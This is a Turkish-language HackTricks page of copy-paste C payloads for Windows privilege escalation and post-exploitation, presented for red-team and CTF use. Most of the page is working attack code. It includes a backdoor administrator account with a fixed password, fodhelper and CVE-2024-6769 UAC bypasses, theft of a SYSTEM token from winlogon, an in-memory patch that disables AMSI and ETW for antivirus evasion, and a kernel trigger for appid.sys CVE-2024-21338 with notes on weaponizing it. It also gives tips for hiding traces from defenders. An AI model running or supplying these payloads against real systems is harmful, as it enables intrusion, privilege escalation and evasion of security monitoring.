# Windows C Payload'ları

{{#include ../../banners/hacktricks-training.md}}

Bu sayfa, Windows Local Privilege Escalation veya post-exploitation sırasında kullanışlı olan **küçük, kendi içinde çalışabilen C snippet'lerini** toplar. Her payload **copy-paste için uygundur**, yalnızca Windows API / C runtime gerektirir ve `i686-w64-mingw32-gcc` (x86) veya `x86_64-w64-mingw32-gcc` (x64) ile derlenebilir.

> ⚠️  Bu payload'lar, işlemin eylemi gerçekleştirmek için gereken minimum ayrıcalıklara zaten sahip olduğunu varsayar (ör. `SeDebugPrivilege`, `SeImpersonatePrivilege` veya bir UAC bypass için medium-integrity context). Bunlar, bir zafiyetin istismar edilmesi sonucunda arbitrary native code execution elde edilen **red-team veya CTF ortamları** için tasarlanmıştır.

---

## Yerel administrator kullanıcısı ekle
```c
// i686-w64-mingw32-gcc -s -O2 -o addadmin.exe addadmin.c
#include <stdlib.h>
int main(void) {
system("net user hacker Hacker123! /add");
system("net localgroup administrators hacker /add");
return 0;
}
```
---

## UAC Bypass – `fodhelper.exe` Registry Hijack (Medium → High integrity)
Güvenilen binary **`fodhelper.exe`** çalıştırıldığında, aşağıdaki registry path'ini **`DelegateExecute` verb'ünü filtrelemeden** sorgular. Bir attacker, command'ini bu key altında yerleştirerek diske file bırakmadan UAC'yi bypass edebilir.<sup>[[1]](#references)</sup>

*`fodhelper.exe` tarafından sorgulanan registry path'i*
```
HKCU\Software\Classes\ms-settings\Shell\Open\command
```
Yükseltilmiş yetkili bir `cmd.exe` açan minimal bir PoC:
```c
// x86_64-w64-mingw32-gcc -municode -s -O2 -o uac_fodhelper.exe uac_fodhelper.c
#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

int main(void) {
HKEY hKey;
const char *payload = "C:\\Windows\\System32\\cmd.exe"; // change to arbitrary command

// 1. Create the vulnerable registry key
if (RegCreateKeyExA(HKEY_CURRENT_USER,
"Software\\Classes\\ms-settings\\Shell\\Open\\command", 0, NULL, 0,
KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {

// 2. Set default value => our payload
RegSetValueExA(hKey, NULL, 0, REG_SZ,
(const BYTE*)payload, (DWORD)strlen(payload) + 1);

// 3. Empty "DelegateExecute" value = trigger (")
RegSetValueExA(hKey, "DelegateExecute", 0, REG_SZ,
(const BYTE*)"", 1);

RegCloseKey(hKey);

// 4. Launch auto-elevated binary
system("fodhelper.exe");
}
return 0;
}
```
*Windows 10 22H2 ve Windows 11 23H2 üzerinde (Temmuz 2025 yamaları) test edilmiştir. Microsoft `DelegateExecute` path içindeki eksik bütünlük denetimini düzeltmediği için bypass hâlâ çalışıyor.*

---

## UAC Bypass – Activation Context Cache Poisoning (`ctfmon.exe`, CVE-2024-6769)
Drive yeniden eşleme + activation context cache poisoning, yamalanmış Windows 10/11 build’lerine karşı hâlâ çalışıyor; çünkü `ctfmon.exe`, çağıranın impersonated `C:` drive’ından yükleme yapan ve `CSRSS` tarafından cache’lenen DLL redirection’larını yeniden kullanan yüksek bütünlüklü, güvenilir bir UI process olarak çalışıyor. Abuse şu şekilde gerçekleştirilir: `C:` drive’ı saldırganın kontrolündeki storage’a yeniden yönlendirin, trojanized bir `msctf.dll` bırakın, yüksek bütünlük elde etmek için `ctfmon.exe` başlatın, ardından `CSRSS`’ten auto-elevated bir binary tarafından kullanılan bir DLL’i yönlendiren manifest’i cache’lemesini isteyin (örneğin `fodhelper.exe`); böylece sonraki launch, UAC prompt’u göstermeden payload’unuzu devralır.<sup>[[5]](#references)</sup>

Practical workflow:
1. Sahte bir `%SystemRoot%\System32` tree hazırlayın ve hijack etmeyi planladığınız legitimate binary’yi (genellikle `ctfmon.exe`) kopyalayın.
2. Process’iniz içinde `DefineDosDevice(DDD_RAW_TARGET_PATH)` kullanarak `C:` drive’ı yeniden map edin ve değişikliğin local kalması için `DDD_NO_BROADCAST_SYSTEM` kullanın.
3. DLL’inizi + manifest’inizi sahte tree içine bırakın, manifest’i activation-context cache’e push etmek için `CreateActCtx/ActivateActCtx` çağırın, ardından auto-elevated binary’yi başlatın; böylece redirected DLL doğrudan shellcode’unuza resolve edilir.
4. İşiniz bittiğinde saldırgan izlerini silmek için cache entry’sini (`sxstrace ClearCache`) silin veya reboot edin.

<details>
<summary>C - Fake drive + manifest poison helper (CVE-2024-6769)</summary>
```c
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <shlwapi.h>
#pragma comment(lib, "shlwapi.lib")

BOOL WriteWideFile(const wchar_t *path, const wchar_t *data) {
HANDLE h = CreateFileW(path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if (h == INVALID_HANDLE_VALUE) return FALSE;
DWORD bytes = (DWORD)(wcslen(data) * sizeof(wchar_t));
BOOL ok = WriteFile(h, data, bytes, &bytes, NULL);
CloseHandle(h);
return ok;
}

int wmain(void) {
const wchar_t *stage = L"C:\\Users\\Public\\fakeC\\Windows\\System32";
SHCreateDirectoryExW(NULL, stage, NULL);
CopyFileW(L"C:\\Windows\\System32\\ctfmon.exe", L"C:\\Users\\Public\\fakeC\\Windows\\System32\\ctfmon.exe", FALSE);
CopyFileW(L".\\msctf.dll", L"C:\\Users\\Public\\fakeC\\Windows\\System32\\msctf.dll", FALSE);

DefineDosDeviceW(DDD_RAW_TARGET_PATH | DDD_NO_BROADCAST_SYSTEM,
L"C:", L"\\??\\C:\\Users\\Public\\fakeC");

const wchar_t manifest[] =
L"<?xml version='1.0' encoding='UTF-8' standalone='yes'?>"
L"<assembly xmlns='urn:schemas-microsoft-com:asm.v1' manifestVersion='1.0'>"
L" <dependency><dependentAssembly>"
L"  <assemblyIdentity name='Microsoft.Windows.Common-Controls' version='6.0.0.0'"
L"   processorArchitecture='amd64' publicKeyToken='6595b64144ccf1df' language='*' />"
L"  <file name='advapi32.dll' loadFrom='C:\\Users\\Public\\fakeC\\Windows\\System32\\msctf.dll' />"
L" </dependentAssembly></dependency></assembly>";
WriteWideFile(L"C:\\Users\\Public\\fakeC\\payload.manifest", manifest);

ACTCTXW act = { sizeof(act) };
act.lpSource = L"C:\\Users\\Public\\fakeC\\payload.manifest";
ULONG_PTR cookie = 0;
HANDLE ctx = CreateActCtxW(&act);
ActivateActCtx(ctx, &cookie);

STARTUPINFOW si = { sizeof(si) };
PROCESS_INFORMATION pi = { 0 };
CreateProcessW(L"C:\\Windows\\System32\\ctfmon.exe", NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);

WaitForSingleObject(pi.hProcess, 2000);
DefineDosDeviceW(DDD_REMOVE_DEFINITION, L"C:", L"\\??\\C:\\Users\\Public\\fakeC");
return 0;
}
```
</details>

Temizlik ipucu: SYSTEM elde ettikten sonra test sırasında `sxstrace Trace -logfile %TEMP%\sxstrace.etl` komutunu ve ardından `sxstrace Parse` komutunu çalıştırın—logda manifest adınızı görüyorsanız, savunma ekipleri de görebilir; bu nedenle her çalıştırmada path'leri değiştirin.

---

## `SeDebugPrivilege` + `SeImpersonatePrivilege` ile token duplication kullanarak SYSTEM shell başlatma
Mevcut process hem **SeDebug** hem de **SeImpersonate** privilege'larını taşıyorsa (birçok service account için tipik durum), `winlogon.exe` işlemindeki token'ı çalabilir, duplicate edebilir ve elevated bir process başlatabilirsiniz:
```c
// x86_64-w64-mingw32-gcc -O2 -o system_shell.exe system_shell.c -ladvapi32 -luser32
#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>

DWORD FindPid(const wchar_t *name) {
PROCESSENTRY32W pe = { .dwSize = sizeof(pe) };
HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
if (snap == INVALID_HANDLE_VALUE) return 0;
if (!Process32FirstW(snap, &pe)) return 0;
do {
if (!_wcsicmp(pe.szExeFile, name)) {
DWORD pid = pe.th32ProcessID;
CloseHandle(snap);
return pid;
}
} while (Process32NextW(snap, &pe));
CloseHandle(snap);
return 0;
}

int wmain(void) {
DWORD pid = FindPid(L"winlogon.exe");
if (!pid) return 1;

HANDLE hProc   = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
HANDLE hToken  = NULL, dupToken = NULL;

if (OpenProcessToken(hProc, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &hToken) &&
DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &dupToken)) {

STARTUPINFOW si = { .cb = sizeof(si) };
PROCESS_INFORMATION pi = { 0 };
if (CreateProcessWithTokenW(dupToken, LOGON_WITH_PROFILE,
L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL, CREATE_NEW_CONSOLE,
NULL, NULL, &si, &pi)) {
CloseHandle(pi.hProcess);
CloseHandle(pi.hThread);
}
}
if (hProc) CloseHandle(hProc);
if (hToken) CloseHandle(hToken);
if (dupToken) CloseHandle(dupToken);
return 0;
}
```
Bunun nasıl çalıştığına dair daha ayrıntılı bir açıklama için bkz.:

{{#ref}}
sedebug-+-seimpersonate-copy-token.md
{{#endref}}

---

## In-Memory AMSI & ETW Patch (Defence Evasion)
Modern AV/EDR motorlarının çoğu, kötü amaçlı davranışları incelemek için **AMSI** ve **ETW**'ye güvenir. Her iki interface'i de mevcut process içinde erkenden patch'lemek, script tabanlı payload'ların (ör. PowerShell, JScript) taranmasını engeller.<sup>[[2]](#references)</sup>
```c
// gcc -o patch_amsi.exe patch_amsi.c -lntdll
#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <stdio.h>

void Patch(BYTE *address) {
DWORD oldProt;
// mov eax, 0x80070057 ; ret  (AMSI_RESULT_E_INVALIDARG)
BYTE patch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
VirtualProtect(address, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProt);
memcpy(address, patch, sizeof(patch));
VirtualProtect(address, sizeof(patch), oldProt, &oldProt);
}

int main(void) {
HMODULE amsi  = LoadLibraryA("amsi.dll");
HMODULE ntdll = GetModuleHandleA("ntdll.dll");

if (amsi)  Patch((BYTE*)GetProcAddress(amsi,  "AmsiScanBuffer"));
if (ntdll) Patch((BYTE*)GetProcAddress(ntdll, "EtwEventWrite"));

MessageBoxA(NULL, "AMSI & ETW patched!", "OK", MB_OK);
return 0;
}
```
*Yukarıdaki patch process-local'dır; çalıştırıldıktan sonra yeni bir PowerShell başlatmak, AMSI/ETW incelemesi olmadan yürütülür.*

---

## Child'ı Protected Process Light (PPL) olarak oluşturma
Oluşturma sırasında `STARTUPINFOEX` + `PROC_THREAD_ATTRIBUTE_PROTECTION_LEVEL` kullanarak bir child için PPL koruma düzeyi isteyin. Bu, belgelenmiş bir API'dir ve yalnızca hedef image, istenen signer class için imzalanmışsa başarılı olur (Windows/WindowsLight/Antimalware/LSA/WinTcb).<sup>[[3]](#references)[[4]](#references)</sup>
```c
// x86_64-w64-mingw32-gcc -O2 -o spawn_ppl.exe spawn_ppl.c
#include <windows.h>

int wmain(void) {
STARTUPINFOEXW si = {0};
PROCESS_INFORMATION pi = {0};
si.StartupInfo.cb = sizeof(si);

SIZE_T attrSize = 0;
InitializeProcThreadAttributeList(NULL, 1, 0, &attrSize);
si.lpAttributeList = (PPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, attrSize);
InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &attrSize);

DWORD lvl = PROTECTION_LEVEL_ANTIMALWARE_LIGHT; // choose the desired level
UpdateProcThreadAttribute(si.lpAttributeList, 0,
PROC_THREAD_ATTRIBUTE_PROTECTION_LEVEL,
&lvl, sizeof(lvl), NULL, NULL);

if (!CreateProcessW(L"C\\\Windows\\\System32\\\notepad.exe", NULL, NULL, NULL, FALSE,
EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, &si.StartupInfo, &pi)) {
// likely ERROR_INVALID_IMAGE_HASH (577) if the image is not properly signed for that level
return 1;
}
DeleteProcThreadAttributeList(si.lpAttributeList);
HeapFree(GetProcessHeap(), 0, si.lpAttributeList);
CloseHandle(pi.hThread);
CloseHandle(pi.hProcess);
return 0;
}
```
En yaygın kullanılan seviyeler:
- `PROTECTION_LEVEL_WINDOWS_LIGHT` (2)
- `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` (3)
- `PROTECTION_LEVEL_LSA_LIGHT` (4)

Sonucu Protection sütununu kontrol ederek Process Explorer/Process Hacker ile doğrulayın.

---

## Local Service -> Kernel via `appid.sys` Smart-Hash (`IOCTL 0x22A018`, CVE-2024-21338)
`appid.sys`, çağıran `LOCAL SERVICE` olarak çalıştığında user-supplied function pointer'ları kabul eden bir device object (`\\.\\AppID`) sunar; Lazarus bunu PPL'yi devre dışı bırakmak ve arbitrary driver'lar yüklemek için kötüye kullanıyor, bu nedenle red team'ler lab kullanımı için hazır bir trigger bulundurmalıdır.<sup>[[6]](#references)</sup>

Operational notes:
- Hâlâ bir `LOCAL SERVICE` token'ına ihtiyacınız var. `SeImpersonatePrivilege` kullanarak bunu `Schedule` veya `WdiServiceHost` üzerinden çalın, ardından ACL kontrollerinin geçmesi için device'a erişmeden önce impersonate edin.
- IOCTL `0x22A018`, iki callback pointer (query length + read function) içeren bir struct bekler. Her ikisini de token overwrite hazırlayan veya ring-0 primitive'lerini map eden user-mode stub'larına yönlendirin; ancak KernelPatchGuard'ın chain ortasında crash olmasını önlemek için buffer'ları RWX tutun.
- Başarının ardından impersonation'dan çıkın ve device handle'ını revert edin; defender'lar artık beklenmeyen `Device\\AppID` handle'larını arıyor, bu nedenle privilege elde edilir edilmez handle'ı kapatın.

<details>
<summary>C - `appid.sys` Smart-Hash abuse için skeleton trigger</summary>
```c
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <stdio.h>

typedef struct _APPID_SMART_HASH {
ULONGLONG UnknownCtx[4];
PVOID QuerySize;   // called first
PVOID ReadBuffer;  // called with size returned above
BYTE  Reserved[0x40];
} APPID_SMART_HASH;

DWORD WINAPI KernelThunk(PVOID ctx) {
// map SYSTEM shellcode, steal token, etc.
return 0;
}

int wmain(void) {
HANDLE hDev = CreateFileW(L"\\\\.\\AppID", GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
if (hDev == INVALID_HANDLE_VALUE) {
printf("[-] CreateFileW failed: %lu\n", GetLastError());
return 1;
}

APPID_SMART_HASH in = {0};
in.QuerySize = KernelThunk;
in.ReadBuffer = KernelThunk;

DWORD bytes = 0;
if (!DeviceIoControl(hDev, 0x22A018, &in, sizeof(in), NULL, 0, &bytes, NULL)) {
printf("[-] DeviceIoControl failed: %lu\n", GetLastError());
}
CloseHandle(hDev);
return 0;
}
```
</details>

Weaponized bir build için minimal düzeltme: `VirtualAlloc` ile bir RWX section map edin, token duplication stub'ınızı buraya kopyalayın, `KernelThunk = section` olarak ayarlayın ve `DeviceIoControl` döndüğünde PPL altında bile SYSTEM olmalısınız.

---

## Referanslar

- [1] [İlk giriş: Welcome and fileless UAC bypass (fodhelper.exe / ms-settings DelegateExecute)](https://winscripting.blog/2017/05/12/first-entry-welcome-and-uac-bypass/)
- [2] [Memory Patching AMSI Bypass](https://rastamouse.me/memory-patching-amsi-bypass/)
- [3] [CreateProcessAsPPL – minimal PPL process launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [4] [UpdateProcThreadAttribute function (Win32 apps) - Microsoft Learn](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-updateprocthreadattribute)
- [5] [Novel Exploit Chain Enables Windows UAC Bypass](https://www.darkreading.com/vulnerabilities-threats/exploit-chain-windows-uac-bypass)
- [6] [Lazarus and the FudModule Rootkit: Beyond BYOVD with an Admin-to-Kernel Zero-Day](https://www.gendigital.com/blog/insights/research/lazarus-and-the-fudmodule-rootkit-beyond-byovd-with-an-admin-to-kernel-zero-day)

{{#include ../../banners/hacktricks-training.md}}
